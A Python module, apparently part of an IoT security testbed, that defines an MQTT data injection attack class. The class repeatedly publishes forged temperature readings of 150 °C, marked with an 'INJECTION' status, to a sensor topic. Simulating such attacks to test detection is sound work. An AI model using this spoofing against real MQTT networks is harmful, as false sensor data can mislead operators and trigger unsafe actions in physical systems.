"""
Data Injection Attack

Purpose:
    Injects malicious sensor values into the MQTT network.
"""

from backend.attacks.attack_config import (
    TEMPERATURE_TOPIC,
    INJECTION_ATTACK_CLIENT,
    INJECTION_PACKET_INTERVAL,
    INJECTION_ATTACK_DURATION,
)

from backend.attacks.base_attack import BaseAttack


class InjectionAttack(BaseAttack):
    """MQTT Data Injection Attack."""

    def __init__(self):
        super().__init__(
            attack_name="Injection Attack",
            client_id=INJECTION_ATTACK_CLIENT,
            interval=INJECTION_PACKET_INTERVAL,
            duration=INJECTION_ATTACK_DURATION,
        )

        self.packet_count = 0

    def execute(self):
        """Publish malicious sensor values."""

        self.packet_count += 1

        payload = {
            "device_id": "temperature_sensor_01",
            "sensor_type": "temperature",
            "value": 150.0,
            "unit": "°C",
            "status": "INJECTION",
        }

        self.publisher.publish(
            TEMPERATURE_TOPIC,
            payload,
        )

        self.logger.info(
            f"Injection Packet #{self.packet_count} → {TEMPERATURE_TOPIC}"
        )


if __name__ == "__main__":
    attack = InjectionAttack()

    try:
        attack.start()

    except KeyboardInterrupt:
        attack.stop()